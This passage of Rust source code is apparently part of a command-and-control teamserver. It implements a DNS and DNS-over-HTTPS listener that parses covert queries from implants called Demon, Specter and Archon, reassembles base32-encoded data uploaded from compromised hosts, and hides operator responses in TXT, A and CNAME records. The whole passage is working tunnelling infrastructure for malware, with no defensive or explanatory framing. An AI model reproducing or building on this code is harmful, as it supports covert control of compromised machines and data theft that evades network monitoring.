            }
        }

        let entry = doh_uploads.entry(session.to_owned()).or_insert_with(|| DnsPendingUpload {
            chunks: HashMap::new(),
            total,
            received_at: Instant::now(),
            peer_ip,
        });
        entry.chunks.insert(seq, data);

        let expected = entry.total;
        if entry.chunks.len() < usize::from(expected) {
            return DnsUploadAssembly::Pending;
        }

        let mut assembled = Vec::new();
        for i in 0..expected {
            match entry.chunks.get(&i) {
                Some(chunk) => assembled.extend_from_slice(chunk),
                None => {
                    warn!(
                        listener = %self.config.name,
                        %session,
                        "dns doh upload missing chunk {i}/{expected}; discarding"
                    );
                    doh_uploads.remove(session);
                    return DnsUploadAssembly::Rejected;
                }
            }
        }
        doh_uploads.remove(session);
        DnsUploadAssembly::Complete(assembled)
    }
}

pub(crate) fn dns_allowed_query_types(record_types: &[String]) -> Option<Vec<u16>> {
    let configured =
        if record_types.is_empty() { vec!["TXT".to_owned()] } else { record_types.to_vec() };

    let mut allowed = Vec::new();
    for record_type in configured {
        let qtype = match record_type.trim().to_ascii_uppercase().as_str() {
            "A" => DNS_TYPE_A,
            "TXT" => DNS_TYPE_TXT,
            "CNAME" => DNS_TYPE_CNAME,
            _ => return None,
        };

        if !allowed.contains(&qtype) {
            allowed.push(qtype);
        }
    }

    Some(allowed)
}

/// A parsed DNS C2 query from a Demon agent.
#[derive(Debug)]
pub(crate) enum DnsC2Query {
    /// Upload chunk: `<b32hex-data>.<seq>-<total>-<agentid>.up.<domain>`
    Upload { agent_id: u32, seq: u16, total: u16, data: Vec<u8> },
    /// Download request: `<seq>-<agentid>.dn.<domain>`
    Download { agent_id: u32, seq: u16 },
    /// DoH uplink chunk (RFC4648 base32): `<b32>.<seq:04x><total:04x>.<session>.u.<domain>`
    DohUpload { session: String, seq: u16, total: u16, data: Vec<u8> },
    /// DoH ready poll: `rdy.<session>.d.<domain>`
    DohReady { session: String },
    /// DoH chunk fetch: `<seq:04x>.<session>.d.<domain>`
    DohDownload { session: String, seq: u16 },
}

/// A minimally parsed DNS query sufficient for C2 processing.
pub(crate) struct ParsedDnsQuery {
    pub(crate) id: u16,
    /// Raw wire-format QNAME bytes (including final zero label).
    pub(crate) qname_raw: Vec<u8>,
    /// Lowercase parsed labels.
    pub(crate) labels: Vec<String>,
    pub(crate) qtype: u16,
}

/// Parse the first question from a raw DNS UDP payload.
///
/// Returns `None` if the packet is malformed or has ≠ 1 question.
pub(crate) fn parse_dns_query(buf: &[u8]) -> Option<ParsedDnsQuery> {
    if buf.len() < DNS_HEADER_LEN {
        return None;
    }

    let id = u16::from_be_bytes([buf[0], buf[1]]);
    let flags = u16::from_be_bytes([buf[2], buf[3]]);
    if flags & DNS_FLAG_QR != 0 {
        return None;
    }
    let qdcount = u16::from_be_bytes([buf[4], buf[5]]);

    if qdcount != 1 {
        return None;
    }

    let mut pos = DNS_HEADER_LEN;
    let qname_start = pos;
    let mut labels = Vec::new();

    loop {
        if pos >= buf.len() {
            return None;
        }
        let len = usize::from(buf[pos]);
        if len == 0 {
            pos += 1;
            break;
        }
        // Reject DNS pointer compression in queries (not expected in client queries)
        if len & 0xC0 != 0 {
            return None;
        }
        pos += 1;
        if pos + len > buf.len() {
            return None;
        }
        let label = std::str::from_utf8(&buf[pos..pos + len]).ok()?.to_ascii_lowercase();
        labels.push(label);
        pos += len;
    }

    if pos + 4 > buf.len() {
        return None;
    }
    let qtype = u16::from_be_bytes([buf[pos], buf[pos + 1]]);
    let qname_raw = buf[qname_start..pos].to_vec();

    Some(ParsedDnsQuery { id, qname_raw, labels, qtype })
}

/// Parse DNS labels into a [`DnsC2Query`] if they match the expected C2 format.
///
/// Expected formats (labels listed from leftmost to rightmost, domain stripped):
/// * Legacy upload: `["<b32hex>", "<seq>-<total>-<aid>", "up"]`
/// * Legacy download: `["<seq>-<aid>", "dn"]`
/// * DoH upload: `["<b32>", "<seq:04x><total:04x>", "<session_hex16>", "u"]`
/// * DoH ready: `["rdy", "<session_hex16>", "d"]`
/// * DoH chunk: `["<seq:04x>", "<session_hex16>", "d"]`
///
/// DoH session labels are **16 hex digits** (ASCII); case is normalized to lowercase when
/// matching Specter/Archon (`agent/specter/src/doh_transport.rs`, `TransportDoH.c`).
pub(crate) fn parse_dns_c2_query(labels: &[String], domain: &str) -> Option<DnsC2Query> {
    let domain_labels: Vec<&str> = domain.split('.').collect();
    let domain_label_count = domain_labels.len();

    if labels.len() <= domain_label_count {
        return None;
    }

    let suffix = &labels[labels.len() - domain_label_count..];
    if suffix.iter().zip(domain_labels.iter()).any(|(a, b)| a != b) {
        return None;
    }

    let c2_labels = &labels[..labels.len() - domain_label_count];

    match c2_labels.len() {
        4 => {
            let b32data = c2_labels.first()?;
            let seqtotal = c2_labels.get(1)?;
            let session = c2_labels.get(2)?;
            let u = c2_labels.get(3)?;
            if u != "u" || seqtotal.len() != 8 {
                return None;
            }
            let seq = u16::from_str_radix(&seqtotal[..4], 16).ok()?;
            let total = u16::from_str_radix(&seqtotal[4..], 16).ok()?;
            let data = base32_rfc4648_decode(b32data)?;
            let session = normalize_session_hex16(session)?;
            Some(DnsC2Query::DohUpload { session, seq, total, data })
        }
        3 => {
            let a = c2_labels.first()?;
            let b = c2_labels.get(1)?;
            let c = c2_labels.get(2)?;
            if a == "rdy" && c == "d" {
                let session = normalize_session_hex16(b)?;
                return Some(DnsC2Query::DohReady { session });
            }
            if c == "up" {
                let parts: Vec<&str> = b.splitn(3, '-').collect();
                if parts.len() != 3 {
                    return None;
                }
                let seq = u16::from_str_radix(parts[0], 16).ok()?;
                let total = u16::from_str_radix(parts[1], 16).ok()?;
                let agent_id = u32::from_str_radix(parts[2], 16).ok()?;
                let data = base32hex_decode(a)?;
                return Some(DnsC2Query::Upload { agent_id, seq, total, data });
            }
            if c == "d" && a.len() == 4 {
                let session = normalize_session_hex16(b)?;
                let seq = u16::from_str_radix(a, 16).ok()?;
                return Some(DnsC2Query::DohDownload { session, seq });
            }
            None
        }
        2 => {
            let ctrl = c2_labels.first()?;
            let dn = c2_labels.get(1)?;
            if dn != "dn" {
                return None;
            }
            let parts: Vec<&str> = ctrl.splitn(2, '-').collect();
            if parts.len() != 2 {
                return None;
            }
            let seq = u16::from_str_radix(parts[0], 16).ok()?;
            let agent_id = u32::from_str_radix(parts[1], 16).ok()?;
            Some(DnsC2Query::Download { agent_id, seq })
        }
        _ => None,
    }
}

/// Normalize a 16-character session id (8 bytes as hex) to lowercase.
///
/// Specter and Archon emit lowercase hex, but DNS labels are case-insensitive; callers may
/// observe uppercase `A`–`F`.  Pending DoH state is keyed by session — canonicalize so lookups
/// match regardless of wire casing.
pub(crate) fn normalize_session_hex16(s: &str) -> Option<String> {
    if s.len() != DNS_DOH_SESSION_HEX_LEN {
        return None;
    }
    let mut out = String::with_capacity(DNS_DOH_SESSION_HEX_LEN);
    for c in s.chars() {
        if !c.is_ascii_hexdigit() {
            return None;
        }
        out.push(c.to_ascii_lowercase());
    }
    Some(out)
}

/// Encode bytes as lowercase RFC 4648 base32 (no padding).
pub(crate) fn base32_rfc4648_encode(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }
    let out_len = (data.len() * 8).div_ceil(5);
    let mut out = Vec::with_capacity(out_len);
    let mut buf: u64 = 0;
    let mut bits: u32 = 0;
    for &byte in data {
        buf = (buf << 8) | u64::from(byte);
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            out.push(BASE32_RFC4648_ALPHABET[((buf >> bits) & 0x1F) as usize]);
        }
    }
    if bits > 0 {
        out.push(BASE32_RFC4648_ALPHABET[((buf << (5 - bits)) & 0x1F) as usize]);
    }
    // SAFETY: alphabet is ASCII.
    String::from_utf8(out).unwrap_or_default()
}

/// Decode lowercase RFC 4648 base32 (no padding). Rejects invalid characters.
pub(crate) fn base32_rfc4648_decode(s: &str) -> Option<Vec<u8>> {
    let mut buf: u64 = 0;
    let mut bits: u32 = 0;
    let mut out = Vec::with_capacity(s.len() * 5 / 8);
    for ch in s.chars() {
        let val = match ch {
            'a'..='z' => u64::from(ch as u8 - b'a'),
            '2'..='7' => u64::from(ch as u8 - b'2' + 26),
            _ => return None,
        };
        buf = (buf << 5) | val;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1u64 << bits).saturating_sub(1);
        }
    }
    Some(out)
}

/// Split a Demon response payload into RFC4648 base32 chunks for DoH DNS delivery.
pub(crate) fn chunk_response_to_doh_b32(payload: &[u8]) -> Vec<String> {
    payload.chunks(DNS_DOH_RESPONSE_CHUNK_BYTES).map(base32_rfc4648_encode).collect()
}

/// Encode `data` as uppercase base32hex (RFC 4648 §7) with no padding.
pub(crate) fn base32hex_encode(data: &[u8]) -> String {
    let mut result = String::with_capacity((data.len() * 8).div_ceil(5));
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;

    for &byte in data {
        buf = (buf << 8) | u32::from(byte);
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            result.push(char::from(BASE32HEX_ALPHABET[((buf >> bits) & 0x1F) as usize]));
        }
    }

    if bits > 0 {
        result.push(char::from(BASE32HEX_ALPHABET[((buf << (5 - bits)) & 0x1F) as usize]));
    }

    result
}

/// Decode a base32hex string (case-insensitive, no padding) into bytes.
///
/// Returns `None` if any character is outside the base32hex alphabet.
pub(crate) fn base32hex_decode(s: &str) -> Option<Vec<u8>> {
    let mut result = Vec::with_capacity(s.len() * 5 / 8);
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;

    for ch in s.bytes() {
        let val = match ch {
            b'0'..=b'9' => u32::from(ch - b'0'),
            b'a'..=b'v' => u32::from(ch - b'a' + 10),
            b'A'..=b'V' => u32::from(ch - b'A' + 10),
            _ => return None,
        };
        buf = (buf << 5) | val;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            result.push((buf >> bits) as u8);
        }
    }

    Some(result)
}

/// Split a Demon response payload into base32hex-encoded chunks for DNS delivery.
pub(crate) fn chunk_response_to_b32hex(payload: &[u8]) -> Vec<String> {
    payload.chunks(DNS_RESPONSE_CHUNK_BYTES).map(base32hex_encode).collect()
}

/// Maximum octets in a single DNS label (RFC 1035).
pub(crate) const DNS_MAX_LABEL_LEN: usize = 63;
/// Maximum wire-format length of a domain name (RFC 1035).
pub(crate) const DNS_MAX_DOMAIN_WIRE_LEN: usize = 255;

/// Encode `payload` as a DNS wire-format domain name (length-prefixed labels, root terminator).
///
/// The payload is split into labels of at most [`DNS_MAX_LABEL_LEN`] octets. Used for CNAME
/// RDATA so arbitrary C2 strings (base32hex chunks, status tokens) fit in a single RR.
pub(crate) fn dns_wire_domain_from_ascii_payload(payload: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    if payload.is_empty() {
        out.push(1);
        out.push(b'0');
        out.push(0);
        return Some(out);
    }
    for chunk in payload.as_bytes().chunks(DNS_MAX_LABEL_LEN) {
        let len = chunk.len();
        let len_u8 = u8::try_from(len).ok()?;
        out.push(len_u8);
        out.extend_from_slice(chunk);
        if out.len() > DNS_MAX_DOMAIN_WIRE_LEN {
            return None;
        }
    }
    if out.len() + 1 > DNS_MAX_DOMAIN_WIRE_LEN {
        return None;
    }
    out.push(0);
    Some(out)
}

/// Build a DNS response for `query_id` carrying C2 `payload` in an answer RR matching `qtype`.
///
/// The question section is reconstructed from `qname_raw` (which already includes the
/// zero-label terminator). The answer uses a NAME pointer to offset 12 (start of the question
/// QNAME).
///
/// Returns `None` when the payload cannot be represented for the requested type (for example,
/// more than four octets for `A`).
pub(crate) fn build_dns_c2_response(
    query_id: u16,
    qname_raw: &[u8],
    qtype: u16,
    payload: &[u8],
) -> Option<Vec<u8>> {
    let (answer_type, rdata): (u16, Vec<u8>) = match qtype {
        DNS_TYPE_TXT => {
            // Clamp TXT data to 255 bytes (single TXT string limit per RFC 1035).
            let txt_data = &payload[..payload.len().min(255)];
            let mut rdata = Vec::with_capacity(1 + txt_data.len());
            rdata.push(txt_data.len() as u8);
            rdata.extend_from_slice(txt_data);
            (DNS_TYPE_TXT, rdata)
        }
        DNS_TYPE_A => {
            if payload.len() > 4 {
                return None;
            }
            let mut rdata = [0u8; 4];
            rdata[..payload.len()].copy_from_slice(payload);
            (DNS_TYPE_A, rdata.to_vec())
        }
        DNS_TYPE_CNAME => {
            let s = std::str::from_utf8(payload).ok()?;
            let rdata = dns_wire_domain_from_ascii_payload(s)?;
            (DNS_TYPE_CNAME, rdata)
        }
        _ => return None,
    };

    let rdlength = u16::try_from(rdata.len()).ok()?;

    let mut response =
        Vec::with_capacity(DNS_HEADER_LEN + qname_raw.len() + 4 + 2 + 2 + 2 + 4 + 2 + rdata.len());

    // Header (12 bytes)
    response.extend_from_slice(&query_id.to_be_bytes());
    let flags: u16 = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR;
    response.extend_from_slice(&flags.to_be_bytes());
    response.extend_from_slice(&1u16.to_be_bytes()); // qdcount = 1
    response.extend_from_slice(&1u16.to_be_bytes()); // ancount = 1
    response.extend_from_slice(&0u16.to_be_bytes()); // nscount = 0
    response.extend_from_slice(&0u16.to_be_bytes()); // arcount = 0

    // Question section: QNAME + QTYPE + QCLASS
    response.extend_from_slice(qname_raw);
    response.extend_from_slice(&qtype.to_be_bytes()); // QTYPE
    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // QCLASS

    // Answer RR
    // NAME: pointer to offset 12 (start of QNAME in question), encoded as 0xC00C
    response.extend_from_slice(&[0xC0, 0x0C]);
    response.extend_from_slice(&answer_type.to_be_bytes());
    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // CLASS = IN
    response.extend_from_slice(&0u32.to_be_bytes()); // TTL = 0 (no caching)
    response.extend_from_slice(&rdlength.to_be_bytes()); // RDLENGTH
    response.extend_from_slice(&rdata);

    Some(response)
}

/// Build a DNS NXDOMAIN response echoing the question (no answer records).
///
/// Used for Specter/Archon DoH uplink acknowledgements and ready-poll "not yet" probes.
pub(crate) fn build_dns_nxdomain_response(query_id: u16, qname_raw: &[u8], qtype: u16) -> Vec<u8> {
    let mut response = Vec::with_capacity(DNS_HEADER_LEN + qname_raw.len() + 4);
    response.extend_from_slice(&query_id.to_be_bytes());
    let flags: u16 = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NXDOMAIN;
    response.extend_from_slice(&flags.to_be_bytes());
    response.extend_from_slice(&1u16.to_be_bytes()); // qdcount
    response.extend_from_slice(&0u16.to_be_bytes()); // ancount
    response.extend_from_slice(&0u16.to_be_bytes()); // nscount
    response.extend_from_slice(&0u16.to_be_bytes()); // arcount
    response.extend_from_slice(qname_raw);
    response.extend_from_slice(&qtype.to_be_bytes());
    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());
    response
}

/// Build a DNS REFUSED response for `query_id`.
fn build_dns_refused_response(query_id: u16) -> Vec<u8> {
    let mut response = vec![0u8; DNS_HEADER_LEN];
    response[0] = (query_id >> 8) as u8;
    response[1] = query_id as u8;
    let flags: u16 = DNS_FLAG_QR | DNS_RCODE_REFUSED;
    response[2] = (flags >> 8) as u8;
    response[3] = flags as u8;
    response
}

#[allow(clippy::too_many_arguments)]
pub(crate) async fn spawn_dns_listener_runtime(
    config: &DnsListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    plugins: Option<PluginRuntime>,
    downloads: DownloadTracker,
    demon_init_rate_limiter: DemonInitRateLimiter,
    unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
    reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
    shutdown: ShutdownController,
    init_secret_config: DemonInitSecretConfig,
    max_pivot_chain_depth: usize,
    allow_legacy_ctr: bool,
) -> Result<ListenerRuntimeFuture, ListenerManagerError> {
    if dns_allowed_query_types(&config.record_types).is_none() {
        return Err(ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!(
                "unsupported DNS record type configuration: {}",
                config.record_types.join(",")
            ),
        });
    }

    let state = Arc::new(DnsListenerState::new(
        config,
        registry,
        events,
        database,
        sockets,
        plugins,
        downloads,
        demon_init_rate_limiter,
        unknown_callback_probe_audit_limiter,
        reconnect_probe_rate_limiter,
        DnsReconBlockLimiter::new(),
        shutdown,
        init_secret_config,
        max_pivot_chain_depth,
        allow_legacy_ctr,
    ));
    let addr = format!("{}:{}", config.host_bind, config.port_bind);

    let socket =
        UdpSocket::bind(&addr).await.map_err(|error| ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind DNS UDP socket {addr}: {error}"),
        })?;

    Ok(Box::pin(async move {
        let mut buf = vec![0u8; 4096];
        let mut cleanup_interval =
            tokio::time::interval(Duration::from_secs(DNS_UPLOAD_CLEANUP_INTERVAL_SECS));
        let shutdown_signal = state.shutdown.notified();
        tokio::pin!(shutdown_signal);
        loop {
            tokio::select! {
                _ = cleanup_interval.tick() => {
                    state.cleanup_expired_uploads().await;
                }
                _ = &mut shutdown_signal => {
                    return Ok(());
                }
                recv = socket.recv_from(&mut buf) => {
                    let (len, peer) = match recv {
                        Ok(result) => result,
                        Err(error) => {
                            return Err(format!(
                                "dns listener `{}` recv error: {error}",
                                state.config.name
                            ));
                        }
                    };

                    let peer_ip = peer.ip();
                    let packet = &buf[..len];

                    // Process DNS packets on the receive loop to keep backpressure bounded by the
                    // socket buffer instead of creating an unbounded task queue under UDP flood.
                    if let Some(response) = state.handle_dns_packet(packet, peer_ip).await {
                        if let Err(error) = socket.send_to(&response, peer).await {
                            warn!(listener = %state.config.name, %error, "dns listener send error");
                        }
                    }
                }
            }
        }
    }))
}

// Production builds must keep the DNS runtime entrypoint available so manager start paths
// cannot silently drift back to a test-only implementation.
const _: () = {
    let _ = spawn_dns_listener_runtime;
};
